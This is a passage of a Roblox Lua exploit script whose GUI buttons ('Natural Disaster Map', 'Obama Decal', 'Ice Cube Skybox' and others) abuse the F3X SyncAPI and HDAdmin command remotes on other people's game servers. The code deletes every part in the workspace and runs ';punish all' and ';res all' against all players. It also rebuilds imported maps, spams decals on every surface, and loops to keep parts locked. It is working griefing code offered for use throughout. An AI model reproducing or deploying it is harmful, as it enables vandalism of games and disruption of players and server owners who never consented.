        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

-- === Helper Functions ===
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

-- === Giant Skybox Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)

    -- Create a base part
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3) -- wait for it to exist

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere/dome mesh
            SetTexture(v, id)             -- your sky texture asset ID
            MeshResize(v, Vector3.new(90000, 90000, 90000)) -- massive size
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end
GiantSky("99706029040118")

end
})
AddButton({
    Name = "Natural Disaster Map",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin commands (top)
-- ===============================
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) detection
-- ===============================
local backpack = player.Backpack
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("You don't have F3X") return end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helper: delete parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

-- ===============================
-- DELETE ALL PARTS
-- ===============================
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

print("All parts deleted. HDAdmin commands executed (initial).")

-- ===============================
-- F3X Model Loader
-- ===============================
local model_id = "1363947141" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]

-- stash model in Lighting so it doesn’t show locally
imported_model.Parent = Lighting

local f3x_name = "Building Tools"
local destination = workspace

-- cleanup after 15s
task.delay(15, function()
    if imported_model then
        imported_model:Destroy()
    end
end)

-- main function to rebuild a part with F3X
local function f3xbuildpart(fake_part)
    local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

    local partType =
        fake_part:IsA("WedgePart") and "Wedge"
        or fake_part:IsA("Seat") and "Seat"
        or fake_part:IsA("VehicleSeat") and "VehicleSeat"
        or fake_part:IsA("TrussPart") and "Truss"
        or fake_part:IsA("SpawnLocation") and "Spawn"
        or fake_part.Shape == Enum.PartType.Block and "Normal"
        or fake_part.Shape == Enum.PartType.Ball and "Ball"
        or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

    local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

    -- resize
    sync:InvokeServer("SyncResize", {
        { Part = created, CFrame = created.CFrame, Size = fake_part.Size }
    })

    -- transparency
    if fake_part.Transparency > 0 then
        sync:InvokeServer("SyncMaterial", {
            { Part = created, Transparency = fake_part.Transparency }
        })
    end

    -- color
    sync:InvokeServer("SyncColor", {
        { Part = created, Color = fake_part.Color, UnionColoring = true }
    })

    -- material
    sync:InvokeServer("SyncMaterial", {
        { Part = created, Material = fake_part.Material }
    })

    -- collision
    sync:InvokeServer("SyncCollision", {
        { Part = created, CanCollide = fake_part.CanCollide }
    })

    -- textures & decals
    for _, tex in ipairs(fake_part:GetChildren()) do
        if tex:IsA("Texture") then
            sync:InvokeServer("CreateTextures", {
                { Part = created, Face = tex.Face, TextureType = "Texture" }
            })
            sync:InvokeServer("SyncTexture", {
                { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
            })
        elseif tex:IsA("Decal") then
            sync:InvokeServer("CreateTextures", {
                { Part = created, Face = tex.Face, TextureType = "Decal" }
            })
            sync:InvokeServer("SyncTexture", {
                { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
            })
        elseif tex:IsA("SpecialMesh") then
            sync:InvokeServer("CreateMeshes", { { Part = created } })
            sync:InvokeServer("SyncMesh", {
                { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
            })
        end
    end
end

-- loop through the model and rebuild every supported part
for _, part in ipairs(imported_model:GetDescendants()) do
    if part:IsA("BasePart") then
        task.spawn(function()
            f3xbuildpart(part)
        end)
    end
end

print("✅ Finished building model " .. model_id .. " with F3X.")

-- ===============================
-- Large More Blue Concrete Plate (No Collision)
-- ===============================
local function SpawnConcreteAboveModel(model)
    -- Find lowest Y of the model
    local minY = math.huge
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            local partY = part.Position.Y - part.Size.Y/2
            if partY < minY then
                minY = partY
            end
        end
    end

    local plateY = minY + 20 -- 20 studs above the lowest part
    local centerX = model:GetModelCFrame().p.X
    local centerZ = model:GetModelCFrame().p.Z

    -- Spawn part
    fastInvoke({"CreatePart", "Normal", CFrame.new(centerX, plateY, centerZ), workspace})
    task.wait(1)

    for _, v in workspace:GetChildren() do
        if v:IsA("BasePart")
        and math.floor(v.Position.Y) == math.floor(plateY)
        and math.floor(v.Position.X) == math.floor(centerX) then
            spawn(function()
                fastInvoke({"SyncResize", {{Part=v, CFrame=CFrame.new(centerX, plateY, centerZ), Size=Vector3.new(5000,1,5000)}}})
                fastInvoke({"SyncColor", {{Part=v, Color=Color3.fromRGB(0,120,255), UnionColoring=false}}}) -- more blue
                fastInvoke({"SyncMaterial", {{Part=v, Material=Enum.Material.Concrete}}})
                fastInvoke({"SyncCollision", {{Part=v, CanCollide=false}}}) -- no collision
                fastInvoke({"SyncMaterial", {{Part=v, Transparency=0}}}) -- solid

                -- Keep locked
                while task.wait(1) do
                    pcall(function()
                        fastInvoke({"SetLocked", {v}, true})
                    end)
                end
            end)
        end
    end
end

-- Execute blue concrete above model
SpawnConcreteAboveModel(imported_model)

-- ===============================
-- HDAdmin commands (bottom)
-- ===============================
task.delay(2, function()
    pcall(function()
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";fogcolor black")
        wait(0.2)
        RequestCommand:InvokeServer(";res all")
        wait(0.2)
        RequestCommand:InvokeServer(";r6 all")
        wait(0.2)
    end)
end)


    end
})
AddButton({
    Name = "McDonald's Map",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin commands (top)
-- ===============================
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) detection
-- ===============================
local backpack = player.Backpack
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("You don't have F3X") return end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helper: delete parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

-- ===============================
-- DELETE ALL PARTS
-- ===============================
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

print("All parts deleted. HDAdmin commands executed (initial).")

-- ===============================
-- F3X Model Loader
-- ===============================
local model_id = "13448848587" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]

-- stash model in Lighting so it doesn’t show locally
imported_model.Parent = Lighting

-- ===============================
-- Add a respawn inside the model
-- ===============================
local function addRespawnToModel(model)
    local spawn = Instance.new("SpawnLocation")
    spawn.Name = "Respawn"
    spawn.Size = Vector3.new(6,1,6)
    spawn.CFrame = model:GetModelCFrame() * CFrame.new(0,5,0)
    spawn.Anchored = true
    spawn.CanCollide = true
    spawn.Transparency = 0.5
    spawn.BrickColor = BrickColor.new("Bright green")
    spawn.Parent = model
end

addRespawnToModel(imported_model)

local f3x_name = "Building Tools"
local destination = workspace

-- cleanup after 15s
task.delay(15, function()
    if imported_model then
        imported_model:Destroy()
    end
end)

-- main function to rebuild a part with F3X
local function f3xbuildpart(fake_part)
    local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

    local partType =  
        fake_part:IsA("WedgePart") and "Wedge"  
        or fake_part:IsA("Seat") and "Seat"  
        or fake_part:IsA("VehicleSeat") and "VehicleSeat"  
        or fake_part:IsA("TrussPart") and "Truss"  
        or fake_part:IsA("SpawnLocation") and "Spawn"  
        or fake_part.Shape == Enum.PartType.Block and "Normal"  
        or fake_part.Shape == Enum.PartType.Ball and "Ball"  
        or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"  

    local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)  

    -- resize  
    sync:InvokeServer("SyncResize", {  
        { Part = created, CFrame = created.CFrame, Size = fake_part.Size }  
    })  

    -- transparency  
    if fake_part.Transparency > 0 then  
        sync:InvokeServer("SyncMaterial", {  
            { Part = created, Transparency = fake_part.Transparency }  
        })  
    end  

    -- color  
    sync:InvokeServer("SyncColor", {  
        { Part = created, Color = fake_part.Color, UnionColoring = true }  
    })  

    -- material  
    sync:InvokeServer("SyncMaterial", {  
        { Part = created, Material = fake_part.Material }  
    })  

    -- collision  
    sync:InvokeServer("SyncCollision", {  
        { Part = created, CanCollide = fake_part.CanCollide }  
    })  

    -- textures & decals  
    for _, tex in ipairs(fake_part:GetChildren()) do  
        if tex:IsA("Texture") then  
            sync:InvokeServer("CreateTextures", {  
                { Part = created, Face = tex.Face, TextureType = "Texture" }  
            })  
            sync:InvokeServer("SyncTexture", {  
                { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }  
            })  
        elseif tex:IsA("Decal") then  
            sync:InvokeServer("CreateTextures", {  
                { Part = created, Face = tex.Face, TextureType = "Decal" }  
            })  
            sync:InvokeServer("SyncTexture", {  
                { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }  
            })  
        elseif tex:IsA("SpecialMesh") then  
            sync:InvokeServer("CreateMeshes", { { Part = created } })  
            sync:InvokeServer("SyncMesh", {  
                { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }  
            })  
        end  
    end
end

-- loop through the model and rebuild every supported part
for _, part in ipairs(imported_model:GetDescendants()) do
    if part:IsA("BasePart") then
        task.spawn(function()
            f3xbuildpart(part)
        end)
    end
end

print("✅ Finished building model " .. model_id .. " with F3X.")

-- ===============================
task.delay(2, function()
    pcall(function()
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";fogcolor black ;time")
        wait(0.2)
        RequestCommand:InvokeServer(";res all")
        wait(0.2)
        RequestCommand:InvokeServer(";r6 all")
        wait(0.2)
        RequestCommand:InvokeServer(";time 14")
    end)
end)
end
})

AddButton({
    Name = "Mm2 lobby",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin commands (top)
-- ===============================
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) detection
-- ===============================
local backpack = player.Backpack
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("You don't have F3X") return end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helper: delete parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

-- ===============================
-- DELETE ALL PARTS
-- ===============================
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

print("All parts deleted. HDAdmin commands executed (initial).")

-- ===============================
-- F3X Model Loader
-- ===============================
local model_id = "503881422" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]

-- stash model in Lighting so it doesn’t show locally
imported_model.Parent = Lighting

local f3x_name = "Building Tools"
local destination = workspace

-- cleanup after 15s
task.delay(15, function()
    if imported_model then
        imported_model:Destroy()
    end
end)

-- main function to rebuild a part with F3X
local function f3xbuildpart(fake_part)
    local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

    local partType =
        fake_part:IsA("WedgePart") and "Wedge"
        or fake_part:IsA("Seat") and "Seat"
        or fake_part:IsA("VehicleSeat") and "VehicleSeat"
        or fake_part:IsA("TrussPart") and "Truss"
        or fake_part:IsA("SpawnLocation") and "Spawn"
        or fake_part.Shape == Enum.PartType.Block and "Normal"
        or fake_part.Shape == Enum.PartType.Ball and "Ball"
        or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

    local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

    -- resize
    sync:InvokeServer("SyncResize", {
        { Part = created, CFrame = created.CFrame, Size = fake_part.Size }
    })

    -- transparency
    if fake_part.Transparency > 0 then
        sync:InvokeServer("SyncMaterial", {
            { Part = created, Transparency = fake_part.Transparency }
        })
    end

    -- color
    sync:InvokeServer("SyncColor", {
        { Part = created, Color = fake_part.Color, UnionColoring = true }
    })

    -- material
    sync:InvokeServer("SyncMaterial", {
        { Part = created, Material = fake_part.Material }
    })

    -- collision
    sync:InvokeServer("SyncCollision", {
        { Part = created, CanCollide = fake_part.CanCollide }
    })

    -- textures & decals
    for _, tex in ipairs(fake_part:GetChildren()) do
        if tex:IsA("Texture") then
            sync:InvokeServer("CreateTextures", {
                { Part = created, Face = tex.Face, TextureType = "Texture" }
            })
            sync:InvokeServer("SyncTexture", {
                { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
            })
        elseif tex:IsA("Decal") then
            sync:InvokeServer("CreateTextures", {
                { Part = created, Face = tex.Face, TextureType = "Decal" }
            })
            sync:InvokeServer("SyncTexture", {
                { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
            })
        elseif tex:IsA("SpecialMesh") then
            sync:InvokeServer("CreateMeshes", { { Part = created } })
            sync:InvokeServer("SyncMesh", {
                { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
            })
        end
    end
end

-- loop through the model and rebuild every supported part
for _, part in ipairs(imported_model:GetDescendants()) do
    if part:IsA("BasePart") then
        task.spawn(function()
            f3xbuildpart(part)
        end)
    end
end

print("✅ Finished building model " .. model_id .. " with F3X.")

-- ===============================
task.delay(2, function()
    pcall(function()
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";fogcolor black ;time")
        wait(0.2)
        RequestCommand:InvokeServer(";res all")
        wait(0.2)
        RequestCommand:InvokeServer(";r6 all")
        wait(0.2)
        RequestCommand:InvokeServer(";time 14")
    end)
end)
end
})
AddButton({
    Name = "Brookhaven Map",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin commands (top)
-- ===============================
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) detection
-- ===============================
local backpack = player.Backpack
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("You don't have F3X") return end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helper: delete parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

-- ===============================
-- DELETE ALL PARTS
-- ===============================
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

print("All parts deleted. HDAdmin commands executed (initial).")

-- ===============================
-- F3X Model Loader
-- ===============================
local model_id = "12090119957" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]

-- stash model in Lighting so it doesn’t show locally
imported_model.Parent = Lighting

local f3x_name = "Building Tools"
local destination = workspace

-- cleanup after 15s
task.delay(15, function()
    if imported_model then
        imported_model:Destroy()
    end
end)

-- main function to rebuild a part with F3X
local function f3xbuildpart(fake_part)
    local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

    local partType =
        fake_part:IsA("WedgePart") and "Wedge"
        or fake_part:IsA("Seat") and "Seat"
        or fake_part:IsA("VehicleSeat") and "VehicleSeat"
        or fake_part:IsA("TrussPart") and "Truss"
        or fake_part:IsA("SpawnLocation") and "Spawn"
        or fake_part.Shape == Enum.PartType.Block and "Normal"
        or fake_part.Shape == Enum.PartType.Ball and "Ball"
        or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

    local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

    -- resize
    sync:InvokeServer("SyncResize", {
        { Part = created, CFrame = created.CFrame, Size = fake_part.Size }
    })

    -- transparency
    if fake_part.Transparency > 0 then
        sync:InvokeServer("SyncMaterial", {
            { Part = created, Transparency = fake_part.Transparency }
        })
    end

    -- color
    sync:InvokeServer("SyncColor", {
        { Part = created, Color = fake_part.Color, UnionColoring = true }
    })

    -- material
    sync:InvokeServer("SyncMaterial", {
        { Part = created, Material = fake_part.Material }
    })

    -- collision
    sync:InvokeServer("SyncCollision", {
        { Part = created, CanCollide = fake_part.CanCollide }
    })

    -- textures & decals
    for _, tex in ipairs(fake_part:GetChildren()) do
        if tex:IsA("Texture") then
            sync:InvokeServer("CreateTextures", {
                { Part = created, Face = tex.Face, TextureType = "Texture" }
            })
            sync:InvokeServer("SyncTexture", {
                { Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
            })
        elseif tex:IsA("Decal") then
            sync:InvokeServer("CreateTextures", {
                { Part = created, Face = tex.Face, TextureType = "Decal" }
            })
            sync:InvokeServer("SyncTexture", {
                { Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
            })
        elseif tex:IsA("SpecialMesh") then
            sync:InvokeServer("CreateMeshes", { { Part = created } })
            sync:InvokeServer("SyncMesh", {
                { Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
            })
        end
    end
end

-- loop through the model and rebuild every supported part
for _, part in ipairs(imported_model:GetDescendants()) do
    if part:IsA("BasePart") then
        task.spawn(function()
            f3xbuildpart(part)
        end)
    end
end

print("✅ Finished building model " .. model_id .. " with F3X.")

-- ===============================
-- ===============================
-- HDAdmin commands (bottom)
-- ===============================
task.delay(2, function()
    pcall(function()
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";fogcolor black")
        wait(0.2)
        RequestCommand:InvokeServer(";res all")
        wait(0.2)
        RequestCommand:InvokeServer(";r6 all")
        wait(0.2)
    end)
end)
end
})

AddButton({
    Name = "Obama Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

-- ✅ Call spam function with decal ID

spam("5033585543")
    end
})
AddButton({
    Name = "Ice Cube Skybox",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

    remote:InvokeServer(unpack(args))

end

function CreatePart(cf, parent)

    _( {"CreatePart", "Normal", cf, parent} )

end

function SetAnchor(part, state)

    _( {"SyncAnchor", { {["Part"] = part, ["Anchored"] = state} }} )

end

function AddMesh(part)

    _( {"CreateMeshes", { {["Part"] = part} }} )

end

function SetMesh(part, meshid)

    _( {"SyncMesh", { {["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid} }} )

end

function SetTexture(part, texid)

    _( {"SyncMesh", { {["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid} }} )

end

function MeshResize(part, size)

    _( {"SyncMesh", { {["Part"] = part, ["Scale"] = size} }} )

end

function Sky(id)

    local hrp = char:WaitForChild("HumanoidRootPart")

    local cf = hrp.CFrame

    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    for _, v in workspace:GetDescendants() do

        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then

            SetAnchor(v, true)

            AddMesh(v)

            SetMesh(v, "111891702759441")

            SetTexture(v, id)

            MeshResize(v, Vector3.new(8000, 8000, 8000))

        end

    end

end

Sky("16442228290")
    end
})
AddButton({
    Name = "Ice Cube Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

